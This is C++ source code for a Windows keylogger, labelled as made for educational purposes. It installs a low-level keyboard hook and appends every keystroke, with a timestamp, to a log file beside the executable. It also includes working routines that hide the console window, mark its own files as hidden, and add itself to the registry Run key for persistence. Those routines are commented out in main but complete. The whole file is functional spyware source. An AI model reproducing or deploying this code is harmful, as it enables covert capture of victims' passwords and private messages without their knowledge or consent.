#include <windows.h>
#include <fstream>
#include <ctime>

void hideWindow() {
	HWND hWindow = GetConsoleWindow();
	if (hWindow != NULL) {
		if (IsWindowVisible(hWindow)) {
			ShowWindow(hWindow, SW_HIDE);
		}
		CloseHandle(hWindow);
	}
}

std::string keylogger = "", log = "";

bool getFileNames() {
	bool success = false;
	char buffer[MAX_PATH] = "";
	if (GetModuleFileNameA(NULL, buffer, sizeof(buffer)) == 0) {
		printf("Cannot retreive the process file name\n");
	} else {
		keylogger.append(buffer);
		log.append(buffer);
		std::size_t pos = log.rfind(".");
		if (pos == std::string::npos) {
			printf("Cannot set the log file name\n");
		} else {
			log.erase(pos + 1).append("log");
			success = true;
		}
	}
	return success;
}

void write(std::string data) {
	std::ofstream stream(log.c_str(), std::ios::app);
	if (!stream.fail()) {
		stream.write(data.c_str(), data.length());
	}
	stream.close();
}

void logTime() {
	time_t now = time(NULL);
	char buffer[48] = "";
	if (now == -1 || strftime(buffer, sizeof(buffer), "%H:%M:%S %m-%d-%Y", localtime(&now)) == 0) {
		write("<time>N/A</time>");
	} else {
		write(std::string("<time>").append(buffer).append("</time>"));
	}
}

void hide(std::string file) {
	DWORD attr = GetFileAttributesA(file.c_str());
	if (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_HIDDEN)) {
		SetFileAttributesA(file.c_str(), FILE_ATTRIBUTE_HIDDEN);
	}
}

void hideFiles() {
	hide(keylogger);
	hide(log);
}

void startup() {
	HKEY hKey = NULL;
	if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
		RegSetValueExA(hKey, "keylogger", 0, REG_SZ, (LPBYTE) keylogger.c_str(), keylogger.length());
	}
	if (hKey != NULL) {
		RegCloseKey(hKey);
	}
}

bool capital = false, numLock = false, shift = false;

LRESULT CALLBACK kbProc(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HC_ACTION) {
		PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT) lParam;
		if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
			wParam == WM_KEYDOWN ? shift = true : shift = false;
		} else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
			switch (keystroke->vkCode) {
				case 0x41: { write(capital ? (shift ? "a" : "A") : (shift ? "A" : "a")); break; }
				case 0x42: { write(capital ? (shift ? "b" : "B") : (shift ? "B" : "b")); break; }
				case 0x43: { write(capital ? (shift ? "c" : "C") : (shift ? "C" : "c")); break; }
				case 0x44: { write(capital ? (shift ? "d" : "D") : (shift ? "D" : "d")); break; }
				case 0x45: { write(capital ? (shift ? "e" : "E") : (shift ? "E" : "e")); break; }
				case 0x46: { write(capital ? (shift ? "f" : "F") : (shift ? "F" : "f")); break; }
				case 0x47: { write(capital ? (shift ? "g" : "G") : (shift ? "G" : "g")); break; }
				case 0x48: { write(capital ? (shift ? "h" : "H") : (shift ? "H" : "h")); break; }
				case 0x49: { write(capital ? (shift ? "i" : "I") : (shift ? "I" : "i")); break; }
				case 0x4A: { write(capital ? (shift ? "j" : "J") : (shift ? "J" : "j")); break; }
				case 0x4B: { write(capital ? (shift ? "k" : "K") : (shift ? "K" : "k")); break; }
				case 0x4C: { write(capital ? (shift ? "l" : "L") : (shift ? "L" : "l")); break; }
				case 0x4D: { write(capital ? (shift ? "m" : "M") : (shift ? "M" : "m")); break; }
				case 0x4E: { write(capital ? (shift ? "n" : "N") : (shift ? "N" : "n")); break; }
				case 0x4F: { write(capital ? (shift ? "o" : "O") : (shift ? "O" : "o")); break; }
				case 0x50: { write(capital ? (shift ? "p" : "P") : (shift ? "P" : "p")); break; }
				case 0x51: { write(capital ? (shift ? "q" : "Q") : (shift ? "Q" : "q")); break; }
				case 0x52: { write(capital ? (shift ? "r" : "R") : (shift ? "R" : "r")); break; }
				case 0x53: { write(capital ? (shift ? "s" : "S") : (shift ? "S" : "s")); break; }
				case 0x54: { write(capital ? (shift ? "t" : "T") : (shift ? "T" : "t")); break; }
				case 0x55: { write(capital ? (shift ? "u" : "U") : (shift ? "U" : "u")); break; }
				case 0x56: { write(capital ? (shift ? "v" : "V") : (shift ? "V" : "v")); break; }
				case 0x57: { write(capital ? (shift ? "w" : "W") : (shift ? "W" : "w")); break; }
				case 0x58: { write(capital ? (shift ? "x" : "X") : (shift ? "X" : "x")); break; }
				case 0x59: { write(capital ? (shift ? "y" : "Y") : (shift ? "Y" : "y")); break; }
				case 0x5A: { write(capital ? (shift ? "z" : "Z") : (shift ? "Z" : "z")); break; }
				case 0x30: { write(shift ? ")" : "0"); break; }
				case 0x31: { write(shift ? "!" : "1"); break; }
				case 0x32: { write(shift ? "@" : "2"); break; }
				case 0x33: { write(shift ? "#" : "3"); break; }
				case 0x34: { write(shift ? "$" : "4"); break; }
				case 0x35: { write(shift ? "%" : "5"); break; }
				case 0x36: { write(shift ? "^" : "6"); break; }
				case 0x37: { write(shift ? "&" : "7"); break; }
				case 0x38: { write(shift ? "*" : "8"); break; }
				case 0x39: { write(shift ? "(" : "9"); break; }
				case VK_OEM_1: { write(shift ? ":"  : ";");  break; }
				case VK_OEM_2: { write(shift ? "?"  : "/");  break; }
				case VK_OEM_3: { write(shift ? "~"  : "`");  break; }
				case VK_OEM_4: { write(shift ? "{"  : "[");  break; }
				case VK_OEM_5: { write(shift ? "|"  : "\\"); break; }
				case VK_OEM_6: { write(shift ? "}"  : "]");  break; }
				case VK_OEM_7: { write(shift ? "\"" : "'");  break; }
				case VK_OEM_PLUS:   { write(shift ? "+" : "="); break; }
				case VK_OEM_COMMA:  { write(shift ? "<" : ","); break; }
				case VK_OEM_MINUS:  { write(shift ? "_" : "-"); break; }
				case VK_OEM_PERIOD: { write(shift ? ">" : "."); break; }
				case VK_SPACE:    { write(" "); break; }
				case VK_NUMPAD0:  { write("0"); break; }
				case VK_NUMPAD1:  { write("1"); break; }
				case VK_NUMPAD2:  { write("2"); break; }
				case VK_NUMPAD3:  { write("3"); break; }
				case VK_NUMPAD4:  { write("4"); break; }
				case VK_NUMPAD5:  { write("5"); break; }
				case VK_NUMPAD6:  { write("6"); break; }
				case VK_NUMPAD7:  { write("7"); break; }
				case VK_NUMPAD8:  { write("8"); break; }
				case VK_NUMPAD9:  { write("9"); break; }
				case VK_MULTIPLY: { write("*"); break; }
				case VK_ADD:      { write("+"); break; }
				case VK_SUBTRACT: { write("-"); break; }
				case VK_DECIMAL:  { write(","); break; }
				case VK_DIVIDE:   { write("/"); break; }
				case VK_BACK:     { write("[BACKSPACE]"); break; }
				case VK_TAB:      { write("[TAB]");       break; }
				case VK_RETURN:   { write("[ENTER]");     break; }
				case VK_MENU:     { write("[ALT]");       break; }
				case VK_ESCAPE:   { write("[ESC]");       break; }
				case VK_PRIOR:    { write("[PG UP]");     break; }
				case VK_NEXT:     { write("[PG DN]");     break; }
				case VK_END:      { write("[END]");       break; }
				case VK_HOME:     { write("[HOME]");      break; }
				case VK_LEFT:     { write("[LEFT]");      break; }
				case VK_UP:       { write("[RIGHT]");     break; }
				case VK_RIGHT:    { write("[RIGHT]");     break; }
				case VK_DOWN:     { write("[DOWN]");      break; }
				case VK_PRINT:    { write("[PRINT]");     break; }
				case VK_SNAPSHOT: { write("[PRT SC]");    break; }
				case VK_INSERT:   { write("[INSERT]");    break; }
				case VK_DELETE:   { write("[DELETE]");    break; }
				case VK_LWIN:     { write("[WIN KEY]");   break; }
				case VK_RWIN:     { write("[WIN KEY]");   break; }
				case VK_CAPITAL:  { capital = !capital;   break; }
				case VK_NUMLOCK:  { numLock = !numLock;   break; }
				case VK_LCONTROL: { if (wParam == WM_KEYDOWN) { write("[CTRL]"); } break; }
				case VK_RCONTROL: { if (wParam == WM_KEYDOWN) { write("[CTRL]"); } break; }
				case VK_F1:  { write("[F1]");  break; }
				case VK_F2:  { write("[F2]");  break; }
				case VK_F3:  { write("[F3]");  break; }
				case VK_F4:  { write("[F4]");  break; }
				case VK_F5:  { write("[F5]");  break; }
				case VK_F6:  { write("[F6]");  break; }
				case VK_F7:  { write("[F7]");  break; }
				case VK_F8:  { write("[F8]");  break; }
				case VK_F9:  { write("[F9]");  break; }
				case VK_F10: { write("[F10]"); break; }
				case VK_F11: { write("[F11]"); break; }
				case VK_F12: { write("[F12]"); break; }
				default: {
					DWORD dWord = keystroke->scanCode << 16;
					dWord += keystroke->flags << 24;
					char otherKey[16] = "";
					if (GetKeyNameTextA(dWord, otherKey, sizeof(otherKey)) != 0) {
						write(otherKey);
					}
				}
			}
		}
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void run() {
	HHOOK kbHook = SetWindowsHookExA(WH_KEYBOARD_LL, kbProc, NULL, 0);
	if (kbHook == NULL) {
		printf("Cannot install the keyboard hook procedure\n");
	} else {
		printf("Keylogger is up and running...\n");
		capital = GetKeyState(VK_CAPITAL);
		numLock = GetKeyState(VK_NUMLOCK);
		MSG msg = { 0 };
		while (GetMessage(&msg, NULL, 0, 0) != WM_QUIT) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		UnhookWindowsHookEx(kbHook);
		CloseHandle(kbHook);
	}
}

int main() {
	// hideWindow();
	SetConsoleTitle("Keylogger");
	printf("#######################################################################\n");
	printf("#                                                                     #\n");
	printf("#                              Keylogger                              #\n");
	printf("#                                   by Ivan Sincek                    #\n");
	printf("#                                                                     #\n");
	printf("# Made for educational purposes.                                      #\n");
	printf("# GitHub repository at github.com/ivan-sincek/keylogger.              #\n");
	printf("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.  #\n");
	printf("#                                                                     #\n");
	printf("#######################################################################\n");
	if (getFileNames()) {
		logTime();
		// hideFiles();
		// startup();
		run();
	}
	return 0;
}
